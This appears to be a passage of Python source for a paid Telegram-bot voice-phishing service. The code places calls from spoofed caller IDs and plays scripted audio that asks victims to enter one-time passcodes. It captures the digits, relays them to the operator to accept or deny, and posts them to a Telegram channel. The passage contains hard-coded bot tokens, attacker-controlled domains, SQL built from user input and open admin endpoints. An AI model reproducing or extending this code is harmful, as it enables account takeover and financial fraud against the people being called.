        bot.send_message(chat_id,f"""*Code Denied*""",parse_mode='markdown')
        bot.send_message(chat_id,f"""*Reading script again.*""",parse_mode='markdown')
        url = 'https://insufficientmonsoon.online:8443/gather-audio'
        data = {
    "uuid": f"{call_control_id}",
    "audiourl": f"https://atlanta-api.online/scripts/{customscid}/output5.wav",
    "maxdigits": f"{nospace_digits}",

}
        requests.post(url, json=data)
    c.close()
    return 'Webhook received successfully!', 200
        
@app.route('/<script_id>/<chatid>/custom', methods=['POST'])
def custom_prebuild_script_call(script_id,chatid):
    global ringing_handler
    global recording_handler
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    data = request.get_json()
    print(data)
    call_control_id = data['uuid']
    event = data['state']
    c.execute(f"select * from custom_scripts where script_id='{script_id}' limit 1")
    custom_sc_src = c.fetchone()
    digits = custom_sc_src[8]
    nospace_digits= "".join(digits.split())
    c.execute(f"select * from users where user_id='{chatid}' limit 1")
    voices = c.fetchone()
    call_cost = voices[11]
    
    if event == "call.ringing":  
            callhangbutton(chatid)
            
        
    elif event == "call.answered":
            url1 = "https://insufficientmonsoon.online:8443/gather-audio"
            data = {
    "uuid": f"{call_control_id}",
    "audiourl": f"https://atlanta-api.online/scripts/{script_id}/output1.wav",
    "maxdigits":"1"
}
            requests.post(url1, json=data)
            bot.send_message(chatid,f"""*Call Answered 🗣️*""",parse_mode='markdown')

        
    elif event == "call.hangup":
            try:
                recording_handler[call_control_id] = data['recording_url']
                per_call_cost = data['charge']
                call_cost_update = call_cost + per_call_cost
                c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
                db.commit()
            except:
                 print("Recording Error")
            

    elif event == "call.complete":
            global last_message_ids
            mes = "Call Ended ☎️"
            keyboard = types.InlineKeyboardMarkup(row_width=2)
            item1 = types.InlineKeyboardButton(text="Recall", callback_data="/recall")
            item0 = types.InlineKeyboardButton(text="Profile", callback_data="/profile")
            keyboard.add(item1, item0)
            mesid = bot.send_message(chatid,f"""*{mes}*""",reply_markup=keyboard, parse_mode='Markdown').message_id
            last_message_ids[chatid]=mesid
            c.execute(f"Update users set status='active' where user_id={chatid}")
            db.commit()
            try:
                 recurl =  recording_handler[call_control_id]
                 send_record = threading.Thread(target=retrive_recording, args=(recurl,chatid,))
                 send_record.start()
            except:
                 print("error in sending Recording")

    elif event == "dtmf.entered":
        data = request.get_json()
        digit =  data['digit']
        bot.send_message(chatid,f"""*Digit Received {digit}*""",parse_mode='markdown')
        
    elif event == "dtmf.gathered":
        data = request.get_json()
        otp2 = data['digits']

        if otp2 == "1":
            def custom_ask_otp():
                url3 = 'https://insufficientmonsoon.online:8443/gather-audio'
                data = {
    "uuid": f"{call_control_id}",
    "audiourl": f"https://atlanta-api.online/scripts/{script_id}/output2.wav",
    "maxdigits": f"{nospace_digits}",
    
}
                requests.post(url3, json=data)
            def custom_send_ask_otp(): 
                bot.send_message(chatid,f"""*One pressed, Send OTP 📲*""",parse_mode='markdown')
            custom_bgtask2 = threading.Thread(target=custom_ask_otp)

            custom_bgtask2.start()
            custom_send_ask_otp()
           
        elif(len(otp2)>=4):
            url = 'https://insufficientmonsoon.online:8443/play-audio'
            data = {
    "uuid": f"{call_control_id}",
    "audiourl": f"https://atlanta-api.online/scripts/{script_id}/output4.wav",
}
            requests.post(url, json=data)
            otp_grabbed(chatid,otp=otp2)
            bot.send_message(chatid,f"""*OTP Captured {otp2} ✅*""",parse_mode='markdown')
            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
            keyboard.row_width =2
            keyboard.max_row_keys=2
            item1 = types.KeyboardButton(text="Accept")
            item2 = types.KeyboardButton(text="Deny")
            keyboard.add(item1,item2) 
            callinfo=bot.send_message(chatid, f"*Accept or Deny the code.*", reply_markup=keyboard,parse_mode='markdown')
            requests.post(f"""https://api.telegram.org/bot7081452748:AAEpkbtYUGagv9N55FyH1Zva0to0ft3qDzU/sendMessage?chat_id=@MonsoonDiscussion&text=
🚀 Monsoon OTP Capture 🚀

Custom OTP:- {otp2} ✅
Username:- @{voices[12][0:3]+"****"+voices[12][-3:]} 🆔
Script:- {custom_sc_src[2]} ⌛️
""")
            bot.register_next_step_handler(callinfo,custom_confirm1)
    c.close()
    return 'Webhook received successfully!', 200

#--------------------------------------------------------------------------------------------------------------------------------
 
#_-----------------------------Custom Calling---------------------------------------------------------------------------------------------------------
@bot.message_handler(commands=['customcall'])
def make_call_custon(message):
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    id = message.from_user.id
    username = message.from_user.username
    c.execute(f"Select * from users where user_id={id}")
    row= c.fetchone()
    if row!=None :
        if row[3]!='ban':
            if user_day_check(id)>0:
                    mes =(message.text).split()
                    try:
                        number = mes[1]
                        spoof = mes[2]
                        script_id = mes[3]
                        voice = mes[4]
                        bot.send_message(message.from_user.id,f"""*Call Created*""",parse_mode='markdown')
                        days =user_day_check(id)
                        c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
                        db.commit()
                        c.execute(f"select * from custom_scripts where script_id={script_id} limit 1")
                        custom_sc = c.fetchone()
                        Convert_TTS(custom_sc[3],custom_sc[4],custom_sc[5],custom_sc[6],custom_sc[7],script_id,voice)
                        if custom_sc==None:
                            raise ValueError
                        c.execute(f"Select * from users where user_id={id}")
                        row= c.fetchone()
                        call_s1 = row[6]
                        c.execute(f"select * from custom_scripts where script_id={script_id} limit 1")
                        custom_sc = c.fetchone()
                        c.execute(f"Select * from users where user_id={id}")
                        row= c.fetchone()
                        call_s1 = row[6]
                        if (call_s1!=0):
                                c.execute(f"update call_data set last_service='custom' where chat_id={id} ")
                                db.commit()
                                call_update(id)
                                time.sleep(3)
                                b=custom_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id)
                        else:
                            bot.send_message(message.from_user.id, """*Custom script not found! \n Create First -> /customscript *""",parse_mode='markdown')
                    except:
                         bot.send_message(message.from_user.id, f"*Please try again with new script*",parse_mode='markdown')
            else:
                   bot.send_message(message.from_user.id, "*⚠️ Buy Subscription ⚠️*",parse_mode='markdown')  
                   delete_data(id) 
        else:
                 bot.send_message(message.from_user.id, "*⚠️ Buy Subscription ⚠️*",parse_mode='markdown')   
    else:
       send_welcome(message)

#-handle Call backs -----------------

@bot.callback_query_handler(func=lambda message: True)
def handle_callback(message):
    global last_message_ids
    if message.data == '/dayslimit':
        current_credit(message)
    elif message.data == '/recall':
        recall_now(message)
    elif message.data == '/redeem':
        redeem_user(message)
    elif message.data == '/profile':
        Profile_def(message)
    elif message.data == '/price':
       Price_list(message)
    elif message.data == '/customscript':
        Set_custom(message)
    elif message.data == '/endcall':
        db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
        c = db.cursor()
        c.execute(f"Select * from call_data where chat_id={message.from_user.id}")
        custom_cont = c.fetchone()
        call_control  = custom_cont[1]
        callhangup(call_control)
    elif message.data == '/voice':
        Voices(message)
    elif message.data == '/help':
        bot.send_message(message.from_user.id,"Contact @RomanSAGE For Any Help 🎭")
    elif message.data == '/buy':
        bot.send_message(message.from_user.id,"Directly purchase from @RomanSAGE .")
    elif message.data == '/voiceback':
        Voices(message)
    elif message.data == '/community':
        community(message)
    elif message.data == '/commands':
        Commands(message)
    elif message.data == '/backstart':
        Start_back(message)
    elif message.data == '/privacy':
        Privacy(message)
    elif message.data == '/activatedstartback':
        activatedstartback(message)
    elif message.data == '/features':
        Features(message)
    elif message.data == '/support':
        Support(message)

    elif message.data =='/ind':
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton(text="🔙", callback_data="/voiceback")
        keyboard.add(item1)
    
        bot.edit_message_caption(caption="""
1: `en-IN-NeerjaNeural`
2: `en-IN-PrabhatNeural`
3: `hi-IN-MadhurNeural`
4: `hi-IN-SwaraNeural`
6: `bn-IN-BashkarNeural`
7: `gu-IN-DhwaniNeural`
8: `gu-IN-NiranjanNeural`
9: `kn-IN-SapnaNeural`
10: `kn-IN-GaganNeural`
11: `ml-IN-SobhanaNeural`
12: `ml-IN-MidhunNeural`
13: `mr-IN-AarohiNeural`
14: `mr-IN-ManoharNeural`
15: `ta-IN-PallaviNeural`
16: `ta-IN-ValluvarNeural`
17: `ur-IN-GulNeural`
18: `ur-IN-SalmanNeural`""",chat_id=message.from_user.id,message_id=last_message_ids[message.from_user.id],parse_mode='MarkDown',reply_markup=keyboard)
        
    elif message.data =='/us':
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        item1 = types.InlineKeyboardButton(text="🔙", callback_data="/voiceback")
        keyboard.add(item1)
        bot.edit_message_caption("""
1: `en-US-AmberNeural`
2: `en-US-AnaNeural`
3: `en-US-AriaNeural`
4: `en-US-AshleyNeural`
5: `en-US-BrandonNeural`
6: `en-US-ChristopherNeural`
7: `en-US-CoraNeural`
8: `en-US-DavisNeural`
9: `en-US-ElizabethNeural`
10: `en-US-EricNeural`
11: `en-US-GuyNeural`
12: `en-US-JacobNeural`
13: `en-US-JaneNeural`
14: `en-US-JasonNeural`
15: `en-US-JennyMultilingualNeural`
16: `en-US-JennyNeural`
17: `en-US-MichelleNeural`
18: `en-US-MonicaNeural`
19: `en-US-NancyNeural`
20: `en-US-RogerNeural`
21: `en-US-SaraNeural`
22: `en-US-SteffanNeural`
23: `en-US-TonyNeural`""",chat_id=message.from_user.id, message_id=last_message_ids[message.from_user.id],parse_mode='MarkDown',reply_markup=keyboard)




@app.route('/gen_key', methods=['POST','GET'])
def keygen():
    days =  request.args.get('days')
    key =  put_user_key(days)
    response_data = {'key': f'{key}'}
    return jsonify(response_data)


@app.route('/users', methods=['POST','GET'])
def users():
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    c.execute(F"SELECT * FROM users")
    users = c.fetchall()
    c.close()
    return jsonify(users)


@app.route('/r_data', methods=['POST','GET'])
def rrrrusers():
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    c.execute(F"SELECT * FROM redeem_data")
    users = c.fetchall()
    c.close()
    return jsonify(users)


@app.route('/delete', methods=['POST','GET'])
def delete():
    userid =  request.args.get('userid')
    resp =  delete_data(int(userid))
    response_data = {'Response': f'{resp}'}
    return jsonify(response_data)


@app.route('/announce', methods=['POST','GET'])
def annonce():
    mess =  request.args.get('message')
    user = request.args.get('user')
    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
    c = db.cursor()
    c.execute(f"select * from users ")
    r2= c.fetchall()
    print(r2)
    for users in r2:  
        requests.post(f"https://api.telegram.org/bot7393948338:AAG8R7hWDTb6Z6RXHvtfiuJLVjLxldxP9sU/sendMessage?chat_id={users[1]}&text={user} : {mess}")
    response_data = {'Response': f'Message Sent'}
    return jsonify(response_data)


if __name__ == '__main__':
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain('/etc/letsencrypt/live/atlanta-api.online/fullchain.pem', '/etc/letsencrypt/live/atlanta-api.online/privkey.pem')  # Replace with your actual cert and key paths
    app.run(ssl_context=context, host='0.0.0.0', port=8443, debug=False)
